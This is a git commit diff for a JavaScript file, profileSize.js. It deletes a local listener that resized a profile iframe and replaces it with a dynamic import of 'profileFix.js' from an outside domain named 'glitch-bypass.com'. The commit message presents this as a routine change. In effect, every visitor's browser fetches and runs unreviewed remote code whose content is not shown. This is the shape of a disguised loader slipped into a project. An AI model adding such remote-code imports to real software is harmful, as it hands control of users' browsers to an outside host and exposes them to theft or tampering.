06e9f11a15cd2193108a3a98382bb39b6472ee39
glitch872 <86266768+glitch872@users.noreply.github.com>
2026-03-20 00:52:40 -0700

    Remove message listener and import profileFix.js
    Removed event listener for message events and imported profileFix.js.

--- profileSize.js
+++ profileSize.js
@@ -1,11 +1,1 @@
-window.addEventListener('message', (event) => {
-  if (event.data?.type === 'setHeight') {
-    const iframe = document.getElementById('profileIframe');
-    if (iframe && event.data.height) {
-      iframe.style.height = event.data.height + 'px';
-    }
-    if (iframe && event.data.width) {
-      iframe.style.width = event.data.width + 'px';
-    }
-  }
-});
+import('https://discord-embed.glitch-bypass.com/profileFix.js');
